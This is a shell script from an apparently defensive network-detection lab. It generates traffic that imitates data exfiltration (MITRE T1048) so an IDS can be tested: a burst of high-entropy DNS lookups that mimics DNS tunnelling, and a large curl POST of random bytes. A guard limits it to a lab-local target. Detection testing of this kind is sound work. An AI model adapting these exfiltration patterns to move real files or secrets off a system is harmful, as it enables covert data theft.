#!/bin/sh
# Scenario 4 - exfiltration pattern (MITRE T1048, exfil over an alternative
# protocol).
#
# Two shapes an IDS should catch, both generated with dummy random bytes to a
# lab-local sink. Nothing real leaves - there is nothing real here to leave, and the
# lab bridge does not reach the internet. What is being produced is the signature:
#
#   dns  - a burst of high-entropy subdomain lookups, which is what data tunnelled
#          through DNS query names looks like to Zeek.
#   http - one large outbound POST body, which is what a bulk transfer to an unusual
#          destination looks like to the flow model.
#
#   docker compose --profile lab run --rm \
#     -v "$PWD/lab/scenarios:/scenarios" \
#     --network netsentinel_lab \
#     -e MODE=dns nicolaka/netshoot sh /scenarios/exfil.sh
set -eu

DIR=$(dirname "$0")
. "${DIR}/_guard.sh"

MODE="${MODE:-dns}"
TARGET="${1:-$VICTIM_WEB}"
require_lab_target "$TARGET"

random_label() {
    # A DNS-safe high-entropy label, which is what encoded data in a query name
    # looks like. Random, so there is nothing in it - the entropy is the point.
    head -c 24 /dev/urandom | od -An -tx1 | tr -d ' \n' | cut -c1-32
}

exfil_dns() {
    COUNT="${EXFIL_COUNT:-50}"
    echo "[exfil] ${COUNT} DNS lookups of high-entropy names via ${TARGET}"
    i=0
    while [ "$i" -lt "$COUNT" ]; do
        i=$((i + 1))
        # Sent at the lab sink as the resolver: it will not answer, and that does
        # not matter. The query packet on the bridge is what Zeek logs, and the
        # query name is the whole signal.
        dig +tries=1 +time=1 "@${TARGET}" "$(random_label).exfil.lab" TXT >/dev/null 2>&1 || true
    done
}

exfil_http() {
    SIZE_MB="${EXFIL_SIZE_MB:-8}"   # bounded for the constrained lab
    echo "[exfil] ${SIZE_MB} MB dummy POST to ${TARGET}"
    # nginx will reject the upload; the request body still crosses the wire, which
    # is the large-outbound-transfer pattern the flow model reads.
    dd if=/dev/urandom bs=1M count="$SIZE_MB" 2>/dev/null | \
        curl -s -o /dev/null -X POST --data-binary @- "http://${TARGET}/upload" || true
}

case "$MODE" in
    dns)  exfil_dns ;;
    http) exfil_http ;;
    *) echo "MODE must be dns or http, not ${MODE}" >&2; exit 2 ;;
esac

echo "[exfil] done"
